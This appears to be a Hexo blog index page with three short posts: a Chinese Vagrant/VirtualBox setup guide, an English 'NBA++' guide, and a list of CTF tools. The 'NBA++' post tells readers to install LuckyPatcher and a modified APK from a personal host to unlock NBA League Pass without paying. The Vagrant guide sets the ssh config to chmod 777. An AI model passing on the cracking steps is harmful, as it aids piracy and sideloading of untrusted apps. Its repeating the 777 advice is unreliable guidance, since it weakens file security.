+<p>本章將介紹虛擬機器的基本設定,並且介紹Vagrant的使用方法</p>
+<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ul>
+<li>Windows系統</li>
+<li>8GB RAM 以上</li>
+<li>8GB 以上的儲存空間</li>
+<li>腦袋</li>
+<li><code>Cygwin和Git console請自行安裝</code></li>
+</ul>
+<h2 id="安裝程式"><a href="#安裝程式" class="headerlink" title="安裝程式"></a>安裝程式</h2><p>我自己選用的是<code>Virtual Box</code>和<code>Vagrant</code></p>
+<p><a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="external">VirtualBox載點</a><code>(要下載Extention Pack)</code></p>
+<p><a href="https://www.vagrantup.com/downloads.html" target="_blank" rel="external">Vagrant載點</a></p>
+<h2 id="Vagrant-基本介紹"><a href="#Vagrant-基本介紹" class="headerlink" title="Vagrant 基本介紹"></a>Vagrant 基本介紹</h2><p>Vagrant, 是個基於Virtual Box所開發的一個介面, 它可以有系統的管理各種虛擬機器</p>
+<p>Vagrant在管理系統的映像檔是以Box來管理, 它也可以自製Box來對其他人提供相同的環境<br>對於不會使用Docker的人來說是個不錯的選擇</p>
+<p>(個人覺得使用上有點像Docker, 但是Docker更好用(內部架構也完全不同))</p>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vagrant init //初始化環境</div><div class="line">vagrant up //啟動虛擬機</div><div class="line">vagrant reload //重啟虛擬機</div><div class="line">vagrant halt //關閉虛擬機</div><div class="line">vagrant box add xxxxx //新增xxxxx的Box(也可使用其他資源下載Box)</div></pre></td></tr></table></figure>
+<h2 id="Vagrantfile"><a href="#Vagrantfile" class="headerlink" title="Vagrantfile"></a>Vagrantfile</h2><p>每個藉由Vagrant建立的虛擬機都會透過<code>Vagrantfile</code>來設定虛擬機</p>
+<p>以下是我的Vagrantfile<code>(僅供參考用, 各項設定請依自己的電腦配備做適當的更動)</code></p>
+<script src="//gist.github.com/c53a1c73bc821ee81d7e4e699e65b695.js?file=Vagrantfile.rb"></script>
+<p>以下是Vagrantfile相對應的解釋<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">config.vm.box = &quot;bento/ubuntu-16.04&quot; //宣告該虛擬機的系統</div><div class="line">config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080 //重導向port</div><div class="line">config.vm.network &quot;private_network&quot;, ip: &quot;192.168.33.10&quot; //設定內網IP</div><div class="line">config.vm.synced_folder &quot;../data&quot;, &quot;/vagrant_data&quot; //設定虛擬機與實體機所要同步的資料夾</div><div class="line">vb.memory = &quot;3072&quot; //設定虛擬機RAM大小</div></pre></td></tr></table></figure></p>
+<p>備註:共享資料夾預設是Vagrantfile的所在資料夾, 在虛擬系統內掛載為<code>/vagrant</code></p>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>我自己習慣以ssh連到虛擬機(當然你也可以用Putty)<br>SSH的方法有兩種</p>
+<ul>
+<li>vagrant ssh<br>這是要在虛擬機所屬的資料夾下才能使用</li>
+<li>ssh xxxxx<br>這是要設定ssh才可使用, 但是這在任何資料夾皆可用(個人偏向這個)</li>
+</ul>
+<h3 id="SSH設定-請先裝cygwin並且確認有裝ssh套件"><a href="#SSH設定-請先裝cygwin並且確認有裝ssh套件" class="headerlink" title="SSH設定 (請先裝cygwin並且確認有裝ssh套件)"></a>SSH設定 <code>(請先裝cygwin並且確認有裝ssh套件)</code></h3><p>在你虛擬機資料夾內下<code>vagrant ssh-config --host $hostname</code><br><code>$hostname是自己設定的</code><br>把回應的結果複製起來<br>接下來輸入以下指令:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cd ~/</div><div class="line">mkdir .ssh</div><div class="line">cd .ssh</div><div class="line">touch config</div><div class="line"><span class="meta">#</span>接下來把剛剛複製起來的貼在config裡面</div><div class="line">chmod 777 config</div></pre></td></tr></table></figure><br>接下來只要你有開虛擬機<br>你就可以下<code>ssh $hostname</code></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/zh-tw/vagrant-windows/" data-id="cj8hctxgn000edz36bffqwy8a" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/zh-tw/vagrant-windows/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/zh-tw/vagrant-windows/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
+    <article id="post-NBA++" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/en/NBA++/">NBA++</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/en/NBA++/">
+            <time datetime="2017-05-06T10:21:41.000Z" itemprop="datePublished">2017-05-06</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Cracked-apps/">Cracked apps</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/NBA/">NBA</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <h1 id="NBA"><a href="#NBA" class="headerlink" title="NBA++"></a>NBA++</h1><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><h2 id="Prepartion"><a href="#Prepartion" class="headerlink" title="Prepartion"></a>Prepartion</h2><ul>
+<li><a href="https://racterubspace.lionfree.net/apks/LuckyPatcher.apk" target="_blank" rel="external">LuckyPatcher</a></li>
+<li><a href="http://racterubspace.lionfree.net/apks/NBA804.apk" target="_blank" rel="external">NBA++</a></li>
+</ul>
+<h2 id="Installaion"><a href="#Installaion" class="headerlink" title="Installaion"></a>Installaion</h2><h3 id="1-Remove-old-NBA-app"><a href="#1-Remove-old-NBA-app" class="headerlink" title="1. Remove old NBA app"></a>1. Remove old NBA app</h3><h3 id="2-Install-Apps-which-provided-in-this-article"><a href="#2-Install-Apps-which-provided-in-this-article" class="headerlink" title="2. Install Apps which provided in this article"></a>2. Install Apps which provided in this article</h3><ul>
+<li>LuckyPatcher</li>
+<li>NBA++<br><code>Files should be in download/ folder</code></li>
+</ul>
+<h3 id="3-Open-LuckyPatcher-wait-till-it-stop-processing"><a href="#3-Open-LuckyPatcher-wait-till-it-stop-processing" class="headerlink" title="3. Open LuckyPatcher wait till it stop processing"></a>3. Open LuckyPatcher wait till it stop processing</h3><h3 id="4-Open-NBA-then-go-to-LeaguePass-page"><a href="#4-Open-NBA-then-go-to-LeaguePass-page" class="headerlink" title="4. Open NBA++, then go to LeaguePass page"></a>4. Open NBA++, then go to LeaguePass page</h3><ul>
+<li>Choose the first method<br><img src="https://i.imgur.com/c0GfHr2.png" alt="LeaguePass"></li>
+</ul>
+<h3 id="5-After-purchased-LeaguePass-it-should-be-Cracked"><a href="#5-After-purchased-LeaguePass-it-should-be-Cracked" class="headerlink" title="5. After purchased LeaguePass, it should be Cracked."></a>5. After purchased LeaguePass, it should be Cracked.</h3><p><img src="https://i.imgur.com/0Jk6mPp.png" alt="result"></p>
+<h3 id="Enjoy-your-free-NBA-live-stream"><a href="#Enjoy-your-free-NBA-live-stream" class="headerlink" title="Enjoy your free NBA live stream!"></a>Enjoy your free NBA live stream!</h3><p><code>Updated at 2017.05.09  &#39;change storage domain</code></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/en/NBA++/" data-id="cj8hctxfo0004dz36lc2ds84u" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/en/NBA++/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/en/NBA++/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
+    <article id="post-Setup-Enviroment" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/en/Setup-Enviroment/">Setup-Enviroment</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/en/Setup-Enviroment/">
+            <time datetime="2017-05-05T15:43:33.000Z" itemprop="datePublished">2017-05-05</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Enviroment/">Enviroment</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Enviroment/">Enviroment</a>, <a class="tag-link" href="/tags/Ubuntu/">Ubuntu</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <h1 id="Basic-Setup"><a href="#Basic-Setup" class="headerlink" title="Basic Setup"></a>Basic Setup</h1><h2 id="Base-System"><a href="#Base-System" class="headerlink" title="Base System"></a>Base System</h2><p>Ubuntu-16.04(bento)</p>
+<h2 id="Tools-for-CTF"><a href="#Tools-for-CTF" class="headerlink" title="Tools for CTF"></a>Tools for CTF</h2><ul>
+<li>Vim8.0 (with lots of plugins)   <a href="https://github.com/staracg/Ubuntu-Env/blob/master/.vimrc" target="_blank" rel="external">My vimrc</a></li>
+<li>strace</li>
+<li>ltrace</li>
+<li>z3</li>
+<li>GDB with scwuaptx’s Enhancement<ul>
+<li><a href="https://github.com/scwuaptx/peda" target="_blank" rel="external">GDB peda</a></li>
+<li><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="external">Pwngdb</a></li>
+</ul>
+</li>
+<li>pwntools</li>
+<li>ROPgadget</li>
+<li>qira</li>
+<li>binwalk</li>
+<li>bash-completion</li>
+</ul>
+<h2 id="Screenshots"><a href="#Screenshots" class="headerlink" title="Screenshots"></a>Screenshots</h2><ul>
+<li>Vim with Tmux<br><img src="http://i.imgur.com/izWptQP.jpg" alt="123"></li>
+</ul>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cd ~/</div><div class="line">git clone https://github.com/staracg/Ubuntu-Env.git</div><div class="line">cd Ubuntu-Env</div><div class="line">chmod +x install.sh</div><div class="line">./install.sh</div></pre></td></tr></table></figure>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/en/Setup-Enviroment/" data-id="cj8hctxfu0005dz363tcd13sb" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/en/Setup-Enviroment/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/en/Setup-Enviroment/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+</section>
+            
+                
+<aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="no-thumbnail">
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Write-up/">Write-up</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/hitcon2017CMT/">hitcon2017CMT</a></p>
+                            <p class="item-title"><a href="/zh-tw/hitcon2017-bamboofox/" class="title">HITCON2017-Bamboofox Wargame</a></p>
+                            <p class="item-date"><time datetime="2017-08-25T23:02:43.000Z" itemprop="datePublished">2017-08-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Linux/">Linux</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Linux/Ubuntu/">Ubuntu</a></p>
+                            <p class="item-title"><a href="/zh-tw/ubuntu-fixes/" class="title">Ubuntu-Fixes</a></p>
+                            <p class="item-date"><time datetime="2017-08-13T13:02:20.000Z" itemprop="datePublished">2017-08-13</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Write-up/">Write-up</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/AIS3/">AIS3</a></p>
+                            <p class="item-title"><a href="/zh-tw/ais3-2017/" class="title">AIS3 Pre-Exam 2017</a></p>
+                            <p class="item-date"><time datetime="2017-07-13T15:12:36.000Z" itemprop="datePublished">2017-07-13</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Enviroment/">Enviroment</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Enviroment/Vagrant/">Vagrant</a></p>
+                            <p class="item-title"><a href="/zh-tw/vagrant-windows/" class="title">Vagrant-Windows</a></p>
+                            <p class="item-date"><time datetime="2017-05-24T14:03:38.000Z" itemprop="datePublished">2017-05-24</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Cracked-apps/">Cracked apps</a></p>
+                            <p class="item-title"><a href="/en/NBA++/" class="title">NBA++</a></p>
+                            <p class="item-date"><time datetime="2017-05-06T10:21:41.000Z" itemprop="datePublished">2017-05-06</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分類</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Cracked-apps/">Cracked apps</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Enviroment/">Enviroment</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Enviroment/Vagrant/">Vagrant</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Enviroment/Vagrant/Windows/">Windows</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/Ubuntu/">Ubuntu</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/Ubuntu/Bugfix/">Bugfix</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/">Write-up</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/AIS3/">AIS3</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/AIS3/2017/">2017</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/hitcon2017CMT/">hitcon2017CMT</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/hitcon2017CMT/bamboofox/">bamboofox</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">歸檔</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">標籤</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AIS3/">AIS3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Enviroment/">Enviroment</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NBA/">NBA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vagrant/">Vagrant</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VirtualBox/">VirtualBox</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Writeu-up/">Writeu-up</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bamboofox/">bamboofox</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hitcon2017/">hitcon2017</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">標籤雲</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/AIS3/" style="font-size: 10px;">AIS3</a> <a href="/tags/Enviroment/" style="font-size: 10px;">Enviroment</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/NBA/" style="font-size: 10px;">NBA</a> <a href="/tags/Ubuntu/" style="font-size: 20px;">Ubuntu</a> <a href="/tags/Vagrant/" style="font-size: 10px;">Vagrant</a> <a href="/tags/VirtualBox/" style="font-size: 10px;">VirtualBox</a> <a href="/tags/Writeu-up/" style="font-size: 10px;">Writeu-up</a> <a href="/tags/bamboofox/" style="font-size: 10px;">bamboofox</a> <a href="/tags/hitcon2017/" style="font-size: 10px;">hitcon2017</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">連結</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://stackoverflow.com">StackOverflow</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://github.com">Github</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://gist.github.com">Gist</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2017 Racter Liu<br>
+            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+        this.page.identifier = 'undefined';
+    };
+    (function() { 
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'racterub' + '.disqus.com/count.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+        </script>
+        <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
